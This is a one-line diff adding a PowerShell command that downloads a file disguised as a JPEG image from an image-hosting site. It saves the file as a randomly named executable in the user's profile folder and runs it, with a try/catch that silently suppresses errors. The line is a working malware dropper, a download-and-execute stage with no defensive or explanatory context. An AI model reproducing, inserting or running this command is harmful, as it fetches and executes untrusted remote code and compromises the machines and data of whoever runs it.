@@ -1,0 +1,1 @@
+try{(New-Object System.Net.WebClient).DownloadFile('http://i.cubeupload.com/GWPIbG.jpg',$env:USERPROFILE+'\LHKWCQqmUmYWax.exe');(New-Object -com Shell.Application).ShellExecute($env:USERPROFILE+'\LHKWCQqmUmYWax.exe');}catch {}
